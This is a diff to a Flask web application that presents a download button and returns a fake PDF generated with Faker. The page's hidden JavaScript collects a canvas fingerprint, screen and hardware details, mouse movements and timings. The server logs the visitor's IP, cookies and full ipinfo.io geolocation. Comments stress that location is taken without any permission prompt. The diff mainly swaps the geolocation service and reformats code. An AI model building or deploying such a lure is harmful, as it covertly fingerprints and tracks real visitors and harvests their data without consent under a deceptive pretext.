@@ -2,10 +2,10 @@ from flask import Flask, request, render_template_string, send_file
 import logging
 import json
 import os
+import requests
 from faker import Faker
 from io import BytesIO
 from reportlab.pdfgen import canvas
-import requests
 
 app = Flask(__name__)
 
@@ -21,21 +21,26 @@ fake = Faker()
 
 def get_ip_geolocation(ip):
     """
-    Fetch geolocation data based on the client's IP address using ip-api.com.
-    This method avoids prompting the user for location permission.
+    Uses the ipinfo.io API to perform IP-based geocoding.
+    Returns latitude, longitude, and the complete geolocation data (full JSON).
     """
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}")
+        response = requests.get(f"https://ipinfo.io/{ip}/json")
         if response.status_code == 200:
             data = response.json()
-            if data.get("status") == "success":
-                return data.get("lat"), data.get("lon"), data
+            # Extract latitude and longitude from the 'loc' field if available.
+            loc = data.get("loc")
+            if loc:
+                lat_str, lon_str = loc.split(",")
+                return float(lat_str), float(lon_str), data
+            else:
+                return None, None, data
     except Exception as e:
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
 
 # HTML page with a styled download button and embedded JavaScript to capture extensive client-side data.
-# The geolocation prompt has been removed so that location is fetched on the server side.
+# The geolocation prompt is removed; location is fetched on the server side.
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -49,9 +54,7 @@ HTML_PAGE = """
             margin-top: 100px;
             background-color: #f2f2f2;
         }
-        h1 {
-            color: #333;
-        }
+        h1 { color: #333; }
         button {
             padding: 15px 30px;
             font-size: 18px;
@@ -61,9 +64,7 @@ HTML_PAGE = """
             border-radius: 5px;
             cursor: pointer;
         }
-        button:hover {
-            background-color: #45a049;
-        }
+        button:hover { background-color: #45a049; }
     </style>
 </head>
 <body>
@@ -81,7 +82,7 @@ HTML_PAGE = """
         <input type="hidden" name="pageLoadTime" id="pageLoadTime">
         <input type="hidden" name="clickTime" id="clickTime">
         <input type="hidden" name="dwellTime" id="dwellTime">
-        <!-- Note: latitude and longitude will be determined server-side -->
+        <!-- Latitude and longitude will be determined server-side -->
         <input type="hidden" name="latitude" id="latitude" value="">
         <input type="hidden" name="longitude" id="longitude" value="">
         <input type="hidden" name="lastMouseX" id="lastMouseX">
@@ -106,7 +107,7 @@ HTML_PAGE = """
         var pageLoadTime = Date.now();
         document.getElementById('pageLoadTime').value = pageLoadTime;
         
-        // Variables to capture last mouse position
+        // Capture last mouse position
         var lastMouseX = 0, lastMouseY = 0;
         document.addEventListener('mousemove', function(e) {
             lastMouseX = e.clientX;
@@ -124,8 +125,7 @@ HTML_PAGE = """
             ctx.fillRect(125, 1, 62, 20);
             ctx.fillStyle = "#069";
             ctx.fillText("Hello, world!", 2, 15);
-            var canvasFingerprint = canvas.toDataURL();
-            document.getElementById('canvasFingerprint').value = canvasFingerprint;
+            document.getElementById('canvasFingerprint').value = canvas.toDataURL();
             
             // Hardware and system details
             document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency || '';
@@ -166,11 +166,10 @@ HTML_PAGE = """
             }
         }
         
-        // Intercept form submission to capture client-side data without prompting for geolocation
+        // Intercept form submission to capture client-side data (without geolocation prompt)
         document.getElementById('downloadForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
-            // Populate basic hidden fields with client-side data
+            // Populate basic hidden fields
             document.getElementById('screenWidth').value = screen.width;
             document.getElementById('screenHeight').value = screen.height;
             document.getElementById('colorDepth').value = screen.colorDepth;
@@ -190,7 +189,7 @@ HTML_PAGE = """
             document.getElementById('lastMouseX').value = lastMouseX;
             document.getElementById('lastMouseY').value = lastMouseY;
             
-            // Gather extra data then submit the form (without triggering a geolocation prompt)
+            // Gather extra data then submit the form
             gatherExtraData(function() {
                 e.target.submit();
             });
@@ -206,7 +205,7 @@ def index():
 
 @app.route('/download', methods=['POST'])
 def download():
-    # Server-side data from HTTP request
+    # Server-side data from the HTTP request
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'unknown')
     cookies = request.cookies
@@ -238,13 +237,13 @@ def download():
         'plugins': request.form.get('plugins')
     }
     
-    # Fetch geolocation data using the client IP (no permission required)
+    # Fetch geolocation data via ipinfo.io and store the entire JSON response.
     lat, lon, geo_data = get_ip_geolocation(ip)
     client_data['latitude'] = lat if lat is not None else ""
     client_data['longitude'] = lon if lon is not None else ""
-    client_data['ip_geolocation'] = geo_data
-
-    # Log all the gathered data in JSON format for easy parsing
+    client_data['ip_geolocation'] = geo_data  # Entire JSON from ipinfo.io
+    
+    # Log all the gathered data in JSON format
     log_message = {
         'ip': ip,
         'user_agent': user_agent,
@@ -259,23 +258,16 @@ def download():
     # Generate a PDF using ReportLab and Faker
     buffer = BytesIO()
     p = canvas.Canvas(buffer)
-    
-    # Generate fake text content using Faker
     fake_name = fake.name()
     fake_address = fake.address().replace("\n", ", ")
     fake_text = fake.text(max_nb_chars=200)
-    
-    # Draw text on the PDF
     p.drawString(100, 750, "Fake PDF Document")
     p.drawString(100, 730, f"Name: {fake_name}")
     p.drawString(100, 710, f"Address: {fake_address}")
     p.drawString(100, 690, "Additional Info:")
-    
-    # Add a block of fake text starting at y=670
     text_object = p.beginText(100, 670)
     text_object.textLines(fake_text)
     p.drawText(text_object)
-    
     p.showPage()
     p.save()
     buffer.seek(0)
@@ -298,18 +290,9 @@ def display_logs():
         <meta charset="UTF-8">
         <title>User Logs</title>
         <style>
-            body { 
-                font-family: Arial, sans-serif; 
-                margin: 20px; 
-                background-color: #f9f9f9; 
-            }
+            body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
             h1 { color: #333; }
-            pre { 
-                background: #eee; 
-                padding: 15px; 
-                border-radius: 5px; 
-                overflow: auto; 
-            }
+            pre { background: #eee; padding: 15px; border-radius: 5px; overflow: auto; }
         </style>
     </head>
     <body>
